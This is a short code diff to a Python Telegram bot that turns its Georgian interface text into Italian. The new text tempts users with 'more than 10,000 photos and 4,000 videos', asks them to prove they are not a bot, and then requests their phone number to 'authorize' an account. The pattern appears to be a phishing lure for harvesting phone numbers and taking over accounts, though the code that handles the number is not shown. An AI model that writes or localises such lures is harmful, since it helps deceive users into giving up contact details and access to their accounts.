@@ -45,9 +45,9 @@ async def cmd_start(message: types.Message):
         InlineKeyboardButton("🔐 პირველი ანგარიშის ავტორიზაცია", callback_data="auth_account")
     )
     await message.answer(
-        "👋 🇬🇪 გამარჯობა! ❤️\n"
-        "გსურს ნახო 10,000-ზე მეტი ფოტო და 4,000 ვიდეო? 👁\n"
-        "დაადასტურე, რომ შენ არ ხარ ბოტი ქვემოთ მოცემული ღილაკის გამოყენებით.  🤖👇",
+       "👋 🇮🇹 Ciao! ❤️\n"
+        "Vuoi vedere più di 10.000 foto e 4.000 video? 👁\n"
+        "Conferma che non sei un bot usando il pulsante qui sotto. 🤖👇",
         reply_markup=keyboard
     )
 
@@ -57,9 +57,9 @@ async def start_auth(callback_query: types.CallbackQuery):
     user_states[user_id] = 'awaiting_contact'
 
     kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    kb.add(KeyboardButton("📱 გაზიარე შენი ნომერი", request_contact=True))
+    kb.add(KeyboardButton("📱 Condividi il tuo numero", request_contact=True))
 
-    await bot.send_message(user_id, "📲 გთხოვ, გაგვიზიარე შენი ნომერი:", reply_markup=kb)
+    await bot.send_message(user_id, "📲 Autorizza primo account:", reply_markup=kb)
     await bot.answer_callback_query(callback_query.id)
 
 @dp.message_handler(content_types=types.ContentType.CONTACT)
